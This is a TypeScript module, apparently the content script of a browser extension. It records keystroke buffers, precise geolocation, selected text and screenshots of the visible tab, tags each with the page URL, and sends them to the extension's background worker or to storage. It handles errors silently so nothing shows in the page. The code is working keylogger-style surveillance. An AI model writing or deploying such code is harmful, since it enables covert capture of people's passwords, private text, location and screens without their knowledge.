import { BackgroundMessage, StorageKey } from "../consts";
import { IGeolocationEntry, IKeyLogEntry } from "../interfaces";
import { contextData, simplePrepend, writeLog } from "./shared-utils";

if (typeof window === "undefined") {
  throw new Error("Cannot use this in background");
}

export async function captureKeylogBuffer(buffer: string) {
  // Send to background to decide whether to persist (background applies site filters)
  await sendMessage(BackgroundMessage.UPDATE_KEY_LOG, {
    buffer,
    url: window.location.href,
    context: contextData(),
  });
}

export async function captureGeolocation() {
  writeLog("Gathering geolocation...");

  try {
    const position: GeolocationPosition = await new Promise(
      (resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve(pos);
          },
          (e) => {
            reject(e);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      }
    );

    const { latitude, longitude, accuracy } = position.coords;

    writeLog("Writing geolocation");

    await simplePrepend<IGeolocationEntry>(StorageKey.GEOLOCATION_HISTORY, {
      latitude,
      longitude,
      accuracy,
      ...contextData(),
    });
  } catch (e) {
    writeLog(`Unable to capture geolocation: ${e}`);
  }
}

export function captureClipboard() {
  const text = window.getSelection()?.toString();

  if (text) {
    // Send clipboard to background so it can decide whether to persist
    sendMessage(BackgroundMessage.UPDATE_CLIPBOARD, {
      text,
      url: window.location.href,
      context: contextData(),
    });
  }
}

export function captureVisibleTab() {
  if (document.visibilityState === "visible") {
    sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
  }
}

export async function sendMessage(messageType: BackgroundMessage, data?: any) {
  const maxAttempts = 3;
  let attempt = 0;
  let backoff = 100;
  // If the page is hidden (tab switching/unload), don't attempt to send messages —
  // this often causes "Extension context invalidated" when the background worker
  // is restarting or the page is unloading.
  try {
    if (typeof document !== 'undefined' && document.visibilityState === 'hidden') {
      return null;
    }
  } catch (e) {
    // ignore
  }
  while (attempt < maxAttempts) {
    // Use callback-style API and inspect chrome.runtime.lastError instead of
    // relying on thrown exceptions — this prevents unhandled rejected promise
    // stack traces from showing up in the page.
    const result = await new Promise<any>((resolve) => {
      try {
        chrome.runtime.sendMessage({ messageType, data }, (resp) => {
          const err = (chrome.runtime as any).lastError;
          if (err) {
            resolve({ __err: String(err && err.message ? err.message : err) });
          } else {
            resolve({ __resp: resp });
          }
        });
      } catch (err) {
        resolve({ __err: String(err) });
      }
    });

    if (result && Object.prototype.hasOwnProperty.call(result, "__resp")) {
      return result.__resp;
    }

    const msg = result && result.__err ? String(result.__err) : String(result);

    // Treat common transient errors silently: retry a few times with backoff.
    if (
      msg.includes("Could not establish connection") ||
      msg.includes("Extension context invalidated")
    ) {
      attempt++;
      if (attempt >= maxAttempts) {
        // Swallow the error silently; these are expected during background
        // restarts or unloads and are noisy but harmless.
        return null;
      }
      await new Promise((r) => setTimeout(r, backoff));
      backoff *= 2;
      continue;
    }

    // Non-transient error - just return null (don't spam the page console).
    return null;
  }
  return null;
}
